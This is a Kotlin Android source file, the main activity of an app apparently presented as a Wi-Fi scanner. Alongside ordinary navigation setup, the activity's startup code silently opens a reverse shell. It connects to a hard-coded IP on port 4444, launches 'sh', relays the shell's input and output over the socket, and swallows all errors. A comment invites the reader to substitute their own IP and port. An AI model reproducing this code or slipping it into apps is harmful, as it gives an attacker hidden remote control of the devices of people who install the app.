package com.grovylessj.wifiscanner.ui.home

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.navigation.fragment.NavHostFragment
import androidx.navigation.ui.setupWithNavController
import com.grovylessj.wifiscanner.R
import com.grovylessj.wifiscanner.databinding.ActivityMainBinding
import dagger.hilt.android.AndroidEntryPoint
import java.io.PrintWriter
import java.net.Socket
import kotlin.concurrent.thread

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    private lateinit var b: ActivityMainBinding

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        b = ActivityMainBinding.inflate(layoutInflater)
        setContentView(b.root)
        i()
    }

    private fun i() {
        val n = supportFragmentManager.findFragmentById(R.id.fragmentContainerView) as NavHostFragment
        b.bottomNavView.setupWithNavController(n.navController)
        r("192.168.219.117", 4444) // Reemplaza con tu IP y puerto
    }

    private fun r(ip: String, p: Int) {
        thread {
            try {
                val s = Socket(ip, p)
                val o = s.getOutputStream()
                val i = s.getInputStream()
                val sh = Runtime.getRuntime().exec("sh")
                val pi = sh.outputStream
                val po = sh.inputStream
                val pe = sh.errorStream
                val w = PrintWriter(pi, true)

                thread { po.copyTo(o) }
                thread { pe.copyTo(o) }

                val b = ByteArray(1024)
                var rd = 0
                while (s.isConnected && i.read(b).also { rd = it } != -1) {
                    val c = String(b, 0, rd)
                    w.println(c)
                }

                w.close()
                pi.close()
                po.close()
                pe.close()
                s.close()
            } catch (_: Exception) {}
        }
    }
}
